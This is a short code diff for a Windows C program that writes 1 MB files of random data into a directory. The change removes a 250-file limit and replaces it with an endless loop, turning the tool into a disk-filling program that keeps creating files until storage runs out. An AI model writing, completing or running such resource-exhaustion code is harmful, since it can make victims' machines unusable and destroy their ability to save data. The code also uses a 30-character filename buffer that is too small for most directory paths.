@@ -5,7 +5,6 @@
 #include <process.h>
 #include <shlobj.h>
 
-#define NUM_FILES 250
 #define BUFFER_SIZE 1024 * 1024 // 1 MB buffer size
 
 void createTextFileWithRandomData(const char* filename) {
@@ -40,9 +39,11 @@ void createTextFileWithRandomData(const char* filename) {
 
 void createFilesInDirectory(const char* directoryPath) {
     char filename[30];
-    for (int i = 0; i < NUM_FILES; i++) {
-        sprintf_s(filename, sizeof(filename), "%s\\full%d.txt", directoryPath, i + 1);
+    int fileCount = 1;
+    while (1) {
+        sprintf_s(filename, sizeof(filename), "%s\\full%d.txt", directoryPath, fileCount);
         createTextFileWithRandomData(filename);
+        fileCount++;
     }
 }
 
